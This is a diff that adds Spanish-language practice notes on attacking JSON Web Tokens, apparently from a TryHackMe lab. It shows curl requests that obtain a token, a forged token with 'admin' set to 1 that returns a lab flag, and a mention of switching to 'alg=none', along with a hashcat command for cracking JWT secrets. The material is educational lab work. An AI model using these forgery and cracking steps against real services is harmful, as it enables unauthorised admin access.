@@ -162,4 +162,40 @@ hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list
 
 ### Práctica
 
+Ejemplo 2 :
+
+```
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://10.10.14.214/api/v1.0/example2
+{
+  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4"
+}
+
+```
+
+Nos vamos a la jw.tio y cambiamos el payload a admin = 1
+
+```
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.q8De2tfygNpldMvn581XHEbVzobCkoO1xXY4xRHcdJ8' http://10.10.14.214/api/v1.0/example2?username=admin
+{
+  "message": "Welcome admin, you are an admin, here is your flag: THM{6e32dca9-0d10-4156-a2d9-5e5c7000648a}"
+}
+```
+
+Ejemplo 3:
+
+```
+ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password3" }' http://10.10.14.214/api/v1.0/example3
+{
+  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8"
+}
+```
+
+Cyberchief y cambiamos el alg=none
+
+# Vida de un JWT
+
+## Vida de un Token
+
+
+
 
